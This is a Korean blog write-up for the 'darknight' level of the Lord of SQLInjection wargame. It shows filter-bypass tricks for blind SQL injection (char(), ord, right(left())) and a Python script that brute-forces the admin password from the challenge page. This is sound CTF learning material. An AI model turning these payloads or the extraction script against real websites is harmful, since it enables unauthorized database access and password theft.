---
layout: single
title: "[Lord of SQLInjection] darknight write-up"
date: 2025-04-24 00:41 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (darknight)

### ✏️ 풀이

이번 문제에서는 no와 pw 파리미터 2개를 받아온다. no와 pw 파라미터에 대해서 탐지하는 문자는 아래와 같고, 이번 문제도 마찬가지로 Blind SQLi로 admin의 pw 값을 알아내야 한다.

```
no -> prob _ . () ' substr ascii =
pw -> '
```

![image-20250424004239708](/images/2025-04-24-los-darknight/image-20250424004239708.png)

<br>

일단 pw 파라미터는 넣지 않고 and or 연산자 우선순위를 이용해 like 연산자에 싱글쿼터를 사용할 수 없으므로 char() 안에 아스키 코드 숫자를 넣어 admin을 표현할 수 있다. 아래처럼 일단 Hello admin을 테스트로 띄워봤다. 

![image-20250424005301349](/images/2025-04-24-los-darknight/image-20250424005301349.png)

<br>

이제 ascii와 substr을 우회해야 한다. substr을 우회하기 위해서 right(left(pw,1),1) 을 통해 substr과 동일하게 수행할 수 있다. 또한 ascii 대신 ord 함수를 사용해 사용할 수 있다. 이는 멀티바이셋 언어만 주의해서 사용하면 되기 때문에 패스워드에 한글이 들어가지 않으니 ord를 사용하여 아래처럼 첫 글자가 a인지 테스트해볼 수 있다.

```
1 or id like char(97,100,109,105,110) and ord(right(left(pw,1),1)) like 65-- -
```

![image-20250424011512569](/images/2025-04-24-los-darknight/image-20250424011512569.png)

<br>

아래 코드를 이용해서 문제를 풀 수 있고, 코드를 설명하면 먼저 세션을 쿠키에 설정하고, 해당 페이로드를 no 파라미터에 넣어 get 요청을 날린 후, Hello admin 문자열이 있는지 검사한다. 그럼 chr 함수를 이용해 이 아스키코드 숫자를 문자로 변경 후에 password를 차례로 넣어 password를 추출하는 코드이다.

```python
import requests

password = ""
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = {"PHPSESSID": "3gkm2054bi501f689hd20e39cp"}

for i in range(1, 100):
    found = False
    for j in range(32, 127):
        param = {
            "no": f"1 or id like char(97,100,109,105,110) and ord(right(left(pw,{i}),1)) like {j}-- -"
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        if "Hello admin" in r.text:
            found = True
            password += chr(j)
            print(f"[+] password {i}번째 자리는 {chr(j)}입니다.")
            break
    if not found:
        print("[-] End")
        break

print(password)

```

<br>

pw 파라미터에 password 값을 넣으면 solve!

![image-20250424012146150](/images/2025-04-24-los-darknight/image-20250424012146150.png)